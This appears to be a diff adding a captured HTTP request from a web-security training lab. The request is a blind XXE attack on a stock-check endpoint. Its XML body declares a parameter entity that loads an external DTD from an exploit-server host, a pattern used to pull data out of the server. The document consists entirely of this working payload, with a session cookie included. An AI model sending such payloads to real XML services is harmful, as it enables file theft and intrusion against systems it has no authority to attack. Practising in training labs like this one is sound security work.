@@ -1,0 +1,11 @@
+
+
+
+POST /product/stock HTTP/2
+Host: 0a9200600309c2e481518f5400b700d4.web-security-academy.net
+Cookie: session=N4Kd28Nbdd6c4txVAvHOW25n9iWpzM5n
+Content-Length: 246
+Accept: */*
+Referer: https://0a9200600309c2e481518f5400b700d4.web-security-academy.net/product?productId=1
+
+<?xml version="1.0" encoding="UTF-8" standalone='no'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a1c00ea032cc23c81738e8c01ab0013.exploit-server.net/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
